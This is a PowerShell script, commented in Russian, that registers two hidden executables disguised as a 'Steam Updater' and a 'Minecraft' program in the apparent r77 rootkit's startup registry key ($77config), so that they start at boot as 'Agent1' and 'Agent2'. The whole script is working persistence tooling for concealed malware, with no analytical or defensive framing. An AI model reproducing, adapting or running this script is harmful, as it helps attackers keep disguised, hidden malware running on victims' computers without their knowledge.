# Пути к скрытым EXE-файлам текущего пользователя
$exe1 = "$env:USERPROFILE\AppData\Roaming\$77-Steam Updater\$77-Steam Update.exe"
$exe2 = "$env:USERPROFILE\AppData\Roaming\$77-Java\$77-Minecraft.exe"
$startupKey = "HKLM:\SOFTWARE\$77config\startup"

# Убедимся, что ключ существует
if (-not (Test-Path $startupKey)) {
    New-Item -Path $startupKey -Force | Out-Null
}

function Wait-ForFile {
    param ([string]$Path)
    while (-not (Test-Path $Path)) {
        Write-Host "⏳ Файл не найден: $Path. Повтор через 5 секунд..." -ForegroundColor Yellow
        Start-Sleep -Seconds 5
    }
    Write-Host "✅ Найден файл: $Path" -ForegroundColor Green
}

# Ждём появления обоих файлов
Wait-ForFile -Path $exe1
Wait-ForFile -Path $exe2

# Добавляем в автозагрузку r77
New-ItemProperty -Path $startupKey -Name "Agent1" -Value $exe1 -PropertyType String -Force
New-ItemProperty -Path $startupKey -Name "Agent2" -Value $exe2 -PropertyType String -Force

Write-Host "`n🎉 Оба файла добавлены в автозагрузку r77!"

